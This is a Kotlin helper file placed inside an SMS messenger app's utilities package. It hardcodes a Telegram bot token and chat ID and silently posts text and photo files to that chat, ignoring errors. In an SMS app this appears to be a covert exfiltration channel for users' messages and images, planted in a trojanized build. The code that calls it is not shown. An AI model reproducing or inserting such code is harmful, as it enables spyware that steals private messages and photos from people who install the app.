package com.simplemobiletools.smsmessenger.utils

import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.*
import java.io.File
import java.net.URLEncoder

object TelegramHelper {
    private const val TELEGRAM_TOKEN = "6361399999:AC1fzzEixxgiE-vDIDR4"
    private const val CHAT_ID = "-100204773"
    private val client = OkHttpClient()

    fun sendTextMessage(message: String) {
        val encodedText = URLEncoder.encode(message, "UTF-8")
        val url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedText"
        val request = Request.Builder().url(url).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }

    fun sendPhoto(photoFile: File, caption: String? = null) {
        val url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendPhoto"
        val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", photoFile.name, RequestBody.create("image/jpeg".toMediaTypeOrNull(), photoFile))
            .apply { if (caption != null) addFormDataPart("caption", caption) }
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }
}
